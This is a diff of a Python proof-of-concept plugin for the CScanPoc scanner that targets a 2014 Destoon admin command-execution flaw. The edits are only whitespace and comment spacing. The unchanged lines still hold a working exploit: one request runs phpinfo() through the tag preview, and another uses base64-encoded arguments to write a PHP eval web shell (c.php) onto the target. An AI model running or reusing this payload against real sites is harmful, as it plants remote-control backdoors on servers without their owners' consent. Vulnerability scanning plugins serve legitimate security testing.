@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Destoon_0004_L' # 平台漏洞编号，留空
+    vuln_id = 'Destoon_0004_L'  # 平台漏洞编号，留空
     name = 'Destoon 后台命令执行引发前台csrf Getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-10-21'  # 漏洞公布时间
     desc = '''
         后台一处命令执行漏洞，可直接导致代码执行。
@@ -33,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/admin.php?file=tag&action=preview&tag_code={phpinfo()}'
             url = self.target + payload
             r = requests.get(url)
@@ -49,7 +50,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             #
             payload = '/admin.php?file=tag&action=preview&tag_code={fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x));}'
             url = self.target + payload
@@ -60,6 +61,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
